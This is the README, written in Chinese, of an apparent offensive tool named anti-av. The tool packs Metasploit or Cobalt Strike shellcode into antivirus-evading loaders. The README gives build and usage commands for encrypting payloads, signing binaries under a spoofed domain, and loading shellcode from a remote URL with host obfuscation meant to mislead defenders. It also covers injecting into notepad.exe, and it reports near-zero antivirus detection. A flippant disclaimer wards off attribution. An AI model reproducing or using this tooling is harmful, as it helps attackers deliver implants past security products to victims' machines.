# ANTI-AV



## 免责

本工具学习使用，溯源到b1gcat肯定不是我。



## 描述
*shellcode*免杀加载，*payload*支持**msf** (-f raw)和**cs**(payload raw)



## 安装

### Requirement

```bash
1、建议使用Mac或linux环境
2、安装交叉编译 mingw64
3、安装签名 openssl、osslsigncode
```



### anti-av

```bash
git clone https://github.com/b1gcat/anti-av.git
go build

Usage of ./anti-av:
  -domain string //签名binary时使用该域名。如果唯恐
        domain to be signed (default "baidu.com")
        
  -e    payload to be encrypted //布尔类型和-sc一起使用，对-sc指定的shellcode文件加密
  
  -ho string //远程加载shellcode时，通过隐藏流量（支持域前置）或混淆host达到干扰蓝队流量研判。
        host obfuscator (default "wwww.baidu.com")
        
  -l string //支持加载shellcode方式
        loader: binary (default "binary")
        
  -os string //支持的操作系统
        OS: windows,linux (default "windows")
        
  -sc string //shellcode的文件或url地址。如果是url，则在运行时访问下载。
        encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading (default "payload.e")
  -inject //布尔类型，运行时shellcode注入notepad进程。
        inject payload to notepad.exe       

```



## 使用方案



| 形态              | 说明                    | 生成命令                                                     |
| ----------------- | ----------------------- | ------------------------------------------------------------ |
| 自解密shellcode   | 无                      | ./anti-av -sc ~/Desktop/payload.bin                          |
| 远程加载shellcode | 无                      | 1、./anti-av  -e -sc ~/Desktop/payload.bin    #加密shellcode<br />2、上传payload.e到公共下载服务<br />3、./anti-av -sc http://x.x.x.x/payload.e         #制作加载器 |
| 注入进程          | 会强制注入到notepad.exe | ./anti-av -sc ~/Desktop/payload.bin -inject 或<br />./anti-av -sc http://x.x.x.x/payload.e  -inject |



## 注意

* cs生成raw格式64位 payload，需要勾选x64
* 没有openssl和签名工具的系统可以设置参数 **-domain ""**禁止签名



## 测试

| VT   | 火绒 | 360安全卫士 | 腾讯管家 |
| ---- | ---- | ----------- | -------- |
| 1/68 | √    | √           | √        |

